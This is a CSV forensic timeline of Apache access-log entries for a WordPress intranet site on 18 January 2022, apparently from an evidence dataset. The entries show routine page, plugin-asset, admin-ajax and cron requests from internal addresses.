date,time,timezone,MACB,source,sourcetype,type,user,host,short,desc,version,filename,inode,notes,format,extra
01/18/2022,12:47:29,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.35.118,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.35.118 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 537; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:47:29,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.35.118,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.35.118 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5535; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:47:54,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET / HTTP/1.1 from: 10.35.35.118,http_request: GET / HTTP/1.1 from: 10.35.35.118 code: 200 user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 6128; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:52:42,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET / HTTP/1.1 from: 10.35.33.116,http_request: GET / HTTP/1.1 from: 10.35.33.116 code: 200 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 6128; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:52:42,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/themes/go/dist/css/design-styles/style-traditional.min.css?ve...,http_request: GET /wp-content/themes/go/dist/css/design-styles/style-traditional.min.css?ver=1.5.1 HTTP/1.1 from: 10.35.33.116 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1490; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:52:42,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/themes/go/dist/css/style-shared.min.css?ver=1.5.1 HTTP/1.1 fr...,http_request: GET /wp-content/themes/go/dist/css/style-shared.min.css?ver=1.5.1 HTTP/1.1 from: 10.35.33.116 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 23190; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:52:42,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/themes/go/dist/js/frontend.min.js?ver=1.5.1 HTTP/1.1 from: 10...,http_request: GET /wp-content/themes/go/dist/js/frontend.min.js?ver=1.5.1 HTTP/1.1 from: 10.35.33.116 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 11600; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:52:42,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/css/dist/block-library/style.min.css?ver=5.8.3 HTTP/1.1 from...,http_request: GET /wp-includes/css/dist/block-library/style.min.css?ver=5.8.3 HTTP/1.1 from: 10.35.33.116 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 10846; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:52:42,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2 HTTP/1.1 from: 10....,http_request: GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2 HTTP/1.1 from: 10.35.33.116 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 4505; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:52:42,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/jquery/jquery.min.js?ver=3.6.0 HTTP/1.1 from: 10.35.33.116,http_request: GET /wp-includes/js/jquery/jquery.min.js?ver=3.6.0 HTTP/1.1 from: 10.35.33.116 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 31246; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:52:42,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/wp-embed.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33.116,http_request: GET /wp-includes/js/wp-embed.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33.116 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1098; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:52:42,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-cron.php?doing_wp_cron=1642510362.7998480796813964843750 HTTP/1.1 fr...,http_request: POST /wp-cron.php?doing_wp_cron=1642510362.7998480796813964843750 HTTP/1.1 from: 10.35.35.206 code: 200 user_agent: WordPress/5.8.3; https://intranet.price.fox.org,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 150; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:52:43,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/wp-emoji-release.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33...,http_request: GET /wp-includes/js/wp-emoji-release.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33.116 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5265; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:52:50,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,OPTIONS * HTTP/1.0 from: ::1,http_request: OPTIONS * HTTP/1.0 from: ::1 code: 200 user_agent: Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 110; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:52:51,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,OPTIONS * HTTP/1.0 from: ::1,http_request: OPTIONS * HTTP/1.0 from: ::1 code: 200 user_agent: Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 110; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:56,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /?p=5 HTTP/1.1 from: 10.35.33.144,http_request: GET /?p=5 HTTP/1.1 from: 10.35.33.144 code: 200 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 40142; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/css/wpdiscuz-combo.min.css?ver=5.8.3 ...,http_request: GET /wp-content/plugins/wpdiscuz/assets/css/wpdiscuz-combo.min.css?ver=5.8.3 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 6799; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/js/wpdiscuz-combo.min.js?ver=7.0.4 HT...,http_request: GET /wp-content/plugins/wpdiscuz/assets/js/wpdiscuz-combo.min.js?ver=7.0.4 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 71266; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/css/f...,http_request: GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/css/fa.min.css?ver=7.0.4 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 3464; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/webfo...,http_request: GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/webfonts/fa-brands-400.woff2 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/css/fa.min.css?ver=7.0.4 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 76991; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/webfo...,http_request: GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/webfonts/fa-regular-400.woff2 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/css/fa.min.css?ver=7.0.4 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 13874; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/webfo...,http_request: GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/webfonts/fa-solid-900.woff2 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/css/fa.min.css?ver=7.0.4 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 79823; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/themes/default/css/fonts/sqr721c-webfont.wof...,http_request: GET /wp-content/plugins/wpdiscuz/themes/default/css/fonts/sqr721c-webfont.woff2 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 18908; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4 HTTP/1.1 ...,http_request: GET /wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 20302; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/themes/go/dist/css/design-styles/style-traditional.min.css?ve...,http_request: GET /wp-content/themes/go/dist/css/design-styles/style-traditional.min.css?ver=1.5.1 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1511; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/themes/go/dist/css/style-shared.min.css?ver=1.5.1 HTTP/1.1 fr...,http_request: GET /wp-content/themes/go/dist/css/style-shared.min.css?ver=1.5.1 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 23299; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/themes/go/dist/js/frontend.min.js?ver=1.5.1 HTTP/1.1 from: 10...,http_request: GET /wp-content/themes/go/dist/js/frontend.min.js?ver=1.5.1 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 11687; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/css/dist/block-library/style.min.css?ver=5.8.3 HTTP/1.1 from...,http_request: GET /wp-includes/css/dist/block-library/style.min.css?ver=5.8.3 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 11510; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/comment-reply.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33.144,http_request: GET /wp-includes/js/comment-reply.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1702; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2 HTTP/1.1 from: 10....,http_request: GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 4570; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/jquery/jquery.min.js?ver=3.6.0 HTTP/1.1 from: 10.35.33.144,http_request: GET /wp-includes/js/jquery/jquery.min.js?ver=3.6.0 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 31377; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/wp-embed.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33.144,http_request: GET /wp-includes/js/wp-embed.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1120; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/wp-emoji-release.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33...,http_request: GET /wp-includes/js/wp-emoji-release.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5331; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:57:20,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,OPTIONS * HTTP/1.0 from: ::1,http_request: OPTIONS * HTTP/1.0 from: ::1 code: 200 user_agent: Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 110; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:14,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /?p=5 HTTP/1.1 from: 10.35.33.116,http_request: GET /?p=5 HTTP/1.1 from: 10.35.33.116 code: 200 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 40100; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:14,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/css/wpdiscuz-combo.min.css?ver=5.8.3 ...,http_request: GET /wp-content/plugins/wpdiscuz/assets/css/wpdiscuz-combo.min.css?ver=5.8.3 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 6799; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:14,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/css/f...,http_request: GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/css/fa.min.css?ver=7.0.4 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 2888; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:14,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4 HTTP/1.1 ...,http_request: GET /wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 20302; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:14,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/themes/go/dist/css/design-styles/style-traditional.min.css?ve...,http_request: GET /wp-content/themes/go/dist/css/design-styles/style-traditional.min.css?ver=1.5.1 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1511; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:14,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/themes/go/dist/css/style-shared.min.css?ver=1.5.1 HTTP/1.1 fr...,http_request: GET /wp-content/themes/go/dist/css/style-shared.min.css?ver=1.5.1 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 23299; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
